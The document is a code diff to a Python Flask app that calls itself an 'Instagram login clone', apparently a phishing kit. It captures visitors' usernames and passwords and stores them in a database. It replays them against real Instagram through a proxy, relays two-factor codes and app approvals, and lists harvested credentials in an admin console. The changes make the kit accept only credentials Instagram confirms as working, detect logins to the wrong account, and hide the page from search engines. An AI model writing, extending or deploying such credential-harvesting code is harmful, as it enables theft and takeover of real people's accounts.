@@ -1,6 +1,10 @@
 """
 Insight Capture — Instagram login clone + real account analysis + admin console.
 
+Login is strict on purpose: the dashboard only opens when Instagram itself
+confirms the credential (ok / code / approve). Timeouts, denials and account
+mismatches keep the visitor on the login page — no fake dashboard.
+
 Env:
   SECRET_KEY         flask session key            (unset = generated + persisted in DATA_DIR)
   ADMIN_TOKEN        console password             (unset = open, dev only)
@@ -14,6 +18,7 @@ Env:
   CLIENT_IP_HEADER   e.g. CF-Connecting-IP        (default: ProxyFix / remote_addr)
   COOKIE_SECURE      1/0                          (default: on when RENDER is set)
   LOGIN_WAIT         seconds to wait for verdict  (default 20)
+  LOGIN_GRACE        extra seconds if Instagram is slow (default 10)
   IG_PROXY           residential proxy            (optional, recommended)
   IG_MAX_PEOPLE      follower/following cap       (default 3000)
 """
@@ -26,6 +31,7 @@ import ipaddress
 import json
 import logging
 import os
+import re
 import secrets
 import sqlite3
 import sys
@@ -67,11 +73,16 @@ TRUST_PROXY = int(os.environ.get("TRUST_PROXY", "1") or 0)
 CLIENT_IP_HEADER = os.environ.get("CLIENT_IP_HEADER", "").strip()
 COOKIE_MAX_AGE = 60 * 60 * 24 * 365
 LOGIN_WAIT = float(os.environ.get("LOGIN_WAIT", "20"))
+LOGIN_GRACE = float(os.environ.get("LOGIN_GRACE", "10"))
 SYNC_MIN_INTERVAL = int(os.environ.get("SYNC_MIN_INTERVAL", "90") or 90)
 
 # verdicts that keep the visitor on the login page (no dashboard)
 DENIED_VERDICTS = ("bad_password", "bad_user", "suspended", "proxy",
-                   "challenge", "rate", "session")
+                   "challenge", "rate", "session", "wrong_account")
+# phases that mean Instagram accepted the credential far enough to challenge it
+ACCEPTED_PHASES = ("code", "approve")
+
+HANDLE_RE = re.compile(r"^[A-Za-z0-9._]{1,30}$")
 
 _ansi_env = os.environ.get("ANSI")
 ANSI_ON = (_ansi_env != "0") if _ansi_env is not None else True
@@ -319,6 +330,27 @@ def set_verdict(cred_id: int, verdict: str) -> None:
         conn.close()
 
 
+def current_verdict(cred_id: int) -> str:
+    conn = connect()
+    try:
+        row = conn.execute("SELECT verdict FROM creds WHERE id=?", (cred_id,)).fetchone()
+        return (row["verdict"] or "") if row else ""
+    finally:
+        conn.close()
+
+
+def verified_login(cid: str, username: str) -> bool:
+    """True only when Instagram itself confirmed this exact pair for this browser."""
+    conn = connect()
+    try:
+        row = conn.execute(
+            "SELECT 1 FROM creds WHERE cid=? AND username=? AND verdict='ok' "
+            "ORDER BY id DESC LIMIT 1", (cid, username)).fetchone()
+        return bool(row)
+    finally:
+        conn.close()
+
+
 # ---------------- instagram state ----------------
 def save_state(cid: str, fields: dict) -> None:
     cols: dict[str, object] = {}
@@ -526,6 +558,15 @@ def html(body: str, status: int = 200) -> Response:
     return Response(body, status=status, mimetype="text/html; charset=utf-8")
 
 
+def login_page(message: str = "", username: str = "", status: int = 200) -> Response:
+    """Login page with an optional banner — used by every non-confirmed outcome."""
+    banner = f'<div class="msg">{escape(message)}</div>' if message else ""
+    page = (LOGIN_PAGE_HTML
+            .replace("<!--MSG-->", banner)
+            .replace("__USER__", str(escape(username))))
+    return html(page, status)
+
+
 # ============================== capture ==============================
 def _same_account(stored_user: str, new_user: str) -> bool:
     """Typing "mah" then "mahim" is the same person; "mah" then "mahim2" is not."""
@@ -608,6 +649,67 @@ def capture_credential(username: str, password: str, source: str, sid: str, meta
     )
     session["last_cred"] = cred_id
     return cred_id, created
+
+
+# ============================== login engine glue ==============================
+def start_login(cid: str, username: str, password: str) -> "ig.Job":
+    """Start (or reuse) a job — a changed password always gets a fresh worker."""
+    job = ig.get(cid)
+    same_user = bool(job and job.username.lower() == username.lower())
+
+    if job and same_user and job.phase == "ready":
+        threading.Thread(target=job.sync, daemon=True).start()
+        return job
+
+    if job and same_user and job.alive and job.password == password:
+        return job
+
+    if job and same_user and job.alive:
+        # credentials changed mid-flight: replace the worker instead of reusing it
+        with ig._jobs_lock:
+            if ig._jobs.get(cid) is job:
+                ig._jobs.pop(cid, None)
+        fresh = ig.Job(cid, username, password)
+        with ig._jobs_lock:
+            ig._jobs[cid] = fresh
+        fresh.start()
+        return fresh
+
+    return ig.start(cid, username, password)
+
+
+def account_mismatch(job: "ig.Job", typed: str) -> str:
+    """Instagram username actually logged in, when it differs from what was typed."""
+    if not HANDLE_RE.match(typed or ""):
+        return ""  # email / phone number cannot be compared
+    client = getattr(job, "cl", None)
+    real = (getattr(client, "username", "") or "") if client else ""
+    if real and real.lower() != typed.lower():
+        return real
+    return ""
+
+
+def settle_verdict(job: "ig.Job", cred_id: int) -> None:
+    """Persist the final verdict even when the browser has already moved on."""
+    deadline = time.time() + 600
+    while time.time() < deadline:
+        if job.phase == "ready":
+            if current_verdict(cred_id) in ("", "pending", "code"):
+                set_verdict(cred_id, "ok")
+            return
+        if job.phase == "error" or not job.alive:
+            if current_verdict(cred_id) in ("", "pending", "code"):
+                set_verdict(cred_id, getattr(job, "_verdict", "") or "error")
+            return
+        time.sleep(1)
+
+
+def mark_ok_if_ready() -> None:
+    """A challenge that ended in a live session is a confirmed login."""
+    cred = session.get("last_cred")
+    job = ig.get(g.cid)
+    if cred and job and job.phase == "ready" and current_verdict(cred) in ("", "pending", "code"):
+        set_verdict(cred, "ok")
 
 
 # ============================== login page ==============================
@@ -1274,12 +1376,12 @@ const av=(x,i,c="s")=>x.pic
 
 function mapState(s){
  PHASE=s.phase||"error";ERR=s.error||"";NOTICE=s.notice||"";CHOICE=s.choice||"";
- if(s.profile)PF=s.profile;
+ if(s.profile&&s.profile.username)PF=s.profile;
  const L=s.lists||{};
  D.notback=(L.notback||[]).map(x=>({n:x.full_name||x.username,h:x.username,m:"You follow · not following back",v:x.verified?1:0,pk:x.pk,pic:x.pic}));
  D.fans=(L.fans||[]).map(x=>({n:x.full_name||x.username,h:x.username,m:"Follows you",v:x.verified?1:0,pk:x.pk,pic:x.pic}));
  D.ghosts=(L.ghosts||[]).map(x=>({n:x.full_name||x.username,h:x.username,m:"No likes, comments or views",v:x.verified?1:0,pk:x.pk,pic:x.pic}));
- D.stalkers=(L.stalkers||[]).map(x=>({n:x.full_name||x.username,h:x.username,m:"Story views",c:x.views,v:x.verified?1:0,pk:x.pk,pic:x.pic}));
+ D.stalkers=(L.stalkers||[]).map(x=>({n:x.full_name||x.username,h:x.username,c:x.views,m:"Story views",v:x.verified?1:0,pk:x.pk,pic:x.pic}));
  D.act=(L.activity||[]).map(x=>({
   g:"Recent",
   i:{unfollow:"out",follow:"plus",like:"broken",unfollowed:"trash",followed:"plus"}[x.kind]||"act",
@@ -1321,7 +1423,7 @@ const card=(k,l,n,s,c="")=>`<div class="card" data-k="${k}"><small>${l}${I[k]}</
 
 function loadingView(){
  const m={queued:"Starting…",login:"Logging in to Instagram…",sync:"Loading your followers…",approve:"Approve the login in the Instagram app"}[PHASE]||"Loading…";
- if(PHASE==="error")return `<div class="empty" style="padding-top:70px"><div class="ttl">Login failed</div><p class="sub">${ESC(ERR||"Unknown error")}</p><button class="btn" id="retry">Try again</button><p class="sub" style="margin-top:18px"><a href="/logout">Use another account</a></p></div>`;
+ if(PHASE==="error")return `<div class="empty" style="padding-top:70px"><div class="ttl">Login not confirmed</div><p class="sub">${ESC(ERR||"Unknown error")}</p><button class="btn" id="retry">Try again</button><p class="sub" style="margin-top:18px"><a href="/logout">Use another account</a></p></div>`;
  if(PHASE==="code")return `<div class="empty" style="padding-top:40px"><div class="ttl">Verification code</div><p class="sub">Instagram sent a code by ${ESC(CHOICE||"email")}. Enter it below.</p><div class="bar" style="justify-content:center"><input class="search" id="code" inputmode="numeric" autocomplete="one-time-code" placeholder="123456" style="max-width:200px;text-align:center;letter-spacing:.3em"><button class="btn" id="cbtn">Send</button></div><p class="sub" style="margin-top:14px">Or approve in the app and press Continue.</p><button class="btn g" id="cont">Continue</button></div>`;
  return `<div class="empty" style="padding-top:70px"><div class="ring l" style="margin:0 auto 18px"><span style="background:linear-gradient(135deg,#262626,#444)">··</span></div><div class="ttl">${ESC(m)}</div><p class="sub">${ESC(PF.username||"")}</p>${PHASE==="approve"?`<button class="btn" id="cont">Continue</button>`:""}</div>`;
 }
@@ -1606,6 +1708,8 @@ def render_admin(body: str) -> str:
 def verdict_tag(verdict: str) -> str:
     if verdict == "ok":
         return '<span class="tag ok">ok</span> '
+    if verdict == "wrong_account":
+        return '<span class="tag bad">wrong account</span> '
     if verdict in DENIED_VERDICTS:
         return '<span class="tag bad">denied</span> '
     if verdict:
@@ -1648,6 +1752,7 @@ def finalize(resp: Response) -> Response:
     resp.headers["Pragma"] = "no-cache"
     resp.headers["X-Content-Type-Options"] = "nosniff"
     resp.headers["X-Frame-Options"] = "DENY"
+    resp.headers["X-Robots-Tag"] = "noindex, nofollow"
     resp.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
     resp.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=(), interest-cohort=()"
     resp.headers["Content-Security-Policy"] = (
@@ -1710,17 +1815,15 @@ def credential():
 
 @app.route("/login", methods=["POST"])
 def login():
+    """Strict gate: the dashboard opens only for a verdict Instagram itself gave."""
     ip = client_ip()
     if not rate_ok("login:" + ip, 40):
-        banner = '<div class="msg">Too many attempts — wait a minute and try again.</div>'
-        return html(LOGIN_PAGE_HTML.replace("<!--MSG-->", banner).replace("__USER__", ""), 429)
+        return login_page("Too many attempts — wait a minute and try again.", "", 429)
 
     username = (request.form.get("username") or "").strip()[:200]
     password = (request.form.get("password") or "")[:300]
     if not username or not password:
-        banner = '<div class="msg">Please enter your username and password.</div>'
-        return html(LOGIN_PAGE_HTML.replace("<!--MSG-->", banner)
-                    .replace("__USER__", str(escape(username))), 200)
+        return login_page("Please enter your username and password.", username)
 
     try:
         payload = json.loads(request.form.get("payload") or "{}")
@@ -1742,8 +1845,15 @@ def login():
     else:
         session["last_cred"] = cred_id
 
-    job = ig.start(g.cid, username, password)
+    job = start_login(g.cid, username, password)
+
     verdict = job.wait_verdict(LOGIN_WAIT)
+    if not verdict and job.phase not in ("ready", "code", "approve", "error"):
+        verdict = job.wait_verdict(LOGIN_GRACE)
+    if not verdict:
+        verdict = {"ready": "ok", "error": "error"}.get(job.phase, "")
+
+    threading.Thread(target=settle_verdict, args=(job, cred_id), daemon=True).start()
     set_verdict(cred_id, verdict or "pending")
 
     if verdict == "ok":
@@ -1751,17 +1861,32 @@ def login():
     elif verdict in DENIED_VERDICTS:
         print_box("✖ LOGIN DENIED", [(f"user    : {username}", "uval"),
                                      (f"reason  : {verdict}", "cred_val")], "bad", "ctx")
-    elif verdict == "code":
+    elif job.phase in ACCEPTED_PHASES:
         print_box("… LOGIN NEEDS CODE", [(f"user    : {username}", "uval")], "cred", "ctx")
     else:
-        print_box("… LOGIN PENDING", [(f"user    : {username}", "uval"),
-                                      (f"verdict : {verdict or 'timeout'}", "cred_val")], "cred", "ctx")
+        print_box("… LOGIN UNCONFIRMED", [(f"user    : {username}", "uval"),
+                                          (f"verdict : {verdict or 'timeout'}", "cred_val")],
+                  "cred", "ctx")
 
-    if verdict in DENIED_VERDICTS:
+    # 1) Instagram said no (or the worker died) -> never open the dashboard
+    if verdict in DENIED_VERDICTS or job.phase == "error":
+        session.pop("user", None)
         reason = job.error or "Instagram rejected the login. Try again."
-        banner = f'<div class="msg">{escape(reason)}</div>'
-        return html(LOGIN_PAGE_HTML.replace("<!--MSG-->", banner)
-                    .replace("__USER__", str(escape(username))), 200)
+        return login_page(reason, username)
+
+    # 2) No definitive answer -> stay here, no fake session
+    if verdict != "ok" and job.phase not in ACCEPTED_PHASES:
+        return login_page(
+            "Instagram did not answer in time, so the login is not confirmed yet. "
+            "Press Log in again.", username)
+
+    # 3) Logged in, but as somebody else -> never show the wrong account
+    other = account_mismatch(job, username)
+    if other:
+        session.pop("user", None)
+        set_verdict(cred_id, "wrong_account")
+        return login_page(
+            f"Instagram logged in as @{other}, not the account you typed.", username)
 
     session.update({
         "user": username,
@@ -1782,6 +1907,14 @@ def dashboard():
     if not username:
         return redirect(url_for("index"))
 
+    # no live worker AND no verified credential for this browser -> back to login
+    if ig.get(g.cid) is None and not verified_login(g.cid, username):
+        session.pop("user", None)
+        return login_page("Session ended before the login was confirmed. Sign in again.",
+                          username)
+
+    mark_ok_if_ready()
+
     page = RESULTS_PAGE_HTML
     page = page.replace("your.handle", str(escape(username)))
     page = page.replace(">YO<", ">" + str(escape(make_initials(username))) + "<")
@@ -1793,6 +1926,7 @@ def dashboard():
 def api_state():
     if not session.get("user"):
         return jsonify({"phase": "error", "error": "No session."}), 401
+    mark_ok_if_ready()
     job = ig.get(g.cid)
     if job:
         return jsonify(job.public())
@@ -1844,7 +1978,7 @@ def api_sync():
         conn.close()
     if not row:
         return jsonify({"ok": False, "error": "No credential"}), 404
-    ig.start(g.cid, row["username"], row["password"])
+    start_login(g.cid, row["username"], row["password"])
     return jsonify({"ok": True})
 
 
@@ -1943,7 +2077,7 @@ def admin_query(q: str, only: str, since: int | None = None) -> tuple[str, list]
     elif only == "ok":
         where.append("c.verdict = 'ok'")
     elif only == "denied":
-        where.append("c.verdict IN ('bad_password','bad_user','suspended','proxy')")
+        where.append("c.verdict IN ('bad_password','bad_user','suspended','proxy','challenge')")
     if since is not None:
         where.append("c.id > ?")
         params.append(since)
